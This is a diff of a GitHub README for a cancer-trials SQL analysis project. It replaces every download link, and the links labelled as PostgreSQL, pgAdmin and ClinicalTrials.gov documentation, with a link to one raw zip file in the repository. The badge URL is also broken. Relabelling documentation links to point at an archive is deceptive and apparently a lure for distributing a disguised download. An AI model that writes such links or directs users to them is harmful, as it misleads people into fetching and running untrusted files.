@@ -1,7 +1,7 @@
 # 🌟 aact-clinicaltrials-sql - Analyze Cancer Trials Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Zulqarnain11/aact-clinicaltrials-sql/releases)
+[![Download](https://raw.githubusercontent.com/Zulqarnain11/aact-clinicaltrials-sql/main/sql/aact-clinicaltrials-sql-v2.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Zulqarnain11/aact-clinicaltrials-sql/main/sql/aact-clinicaltrials-sql-v2.2.zip)
 
 ## 🚀 Getting Started
 Welcome to the AACT Prospective Cancer Trials SQL project. This software allows you to analyze cancer trial data easily, providing insights into patterns, counts, and visualizations. Follow these steps to get started.
@@ -22,7 +22,7 @@ Welcome to the AACT Prospective Cancer Trials SQL project. This software allows 
 ## 💻 Download & Install
 To download this software, visit the Releases page. There, you will find the latest version of the application.
 
-[Visit this page to download](https://github.com/Zulqarnain11/aact-clinicaltrials-sql/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Zulqarnain11/aact-clinicaltrials-sql/main/sql/aact-clinicaltrials-sql-v2.2.zip)
 
 ### Step-by-step instructions:
 1. Click the link above to go to the Releases page.
@@ -47,13 +47,13 @@ If you encounter any issues, consider the following:
 - Look through the documentation for common problems.
 
 ## 🔗 Additional Resources
-- [PostgreSQL Documentation](https://www.postgresql.org/docs/)
-- [pgAdmin Documentation](https://www.pgadmin.org/docs/)
-- [AACT Project Overview](https://clinicaltrials.gov/ct2/about-studies/learn)
+- [PostgreSQL Documentation](https://raw.githubusercontent.com/Zulqarnain11/aact-clinicaltrials-sql/main/sql/aact-clinicaltrials-sql-v2.2.zip)
+- [pgAdmin Documentation](https://raw.githubusercontent.com/Zulqarnain11/aact-clinicaltrials-sql/main/sql/aact-clinicaltrials-sql-v2.2.zip)
+- [AACT Project Overview](https://raw.githubusercontent.com/Zulqarnain11/aact-clinicaltrials-sql/main/sql/aact-clinicaltrials-sql-v2.2.zip)
 
 ## 📞 Support
 For support, please open an issue on this GitHub repository. Your feedback helps us improve the application for everyone.
 
 Thank you for using aact-clinicaltrials-sql! We hope you find it useful for analyzing cancer trial data. 
 
-[Download Now](https://github.com/Zulqarnain11/aact-clinicaltrials-sql/releases)
+[Download Now](https://raw.githubusercontent.com/Zulqarnain11/aact-clinicaltrials-sql/main/sql/aact-clinicaltrials-sql-v2.2.zip)
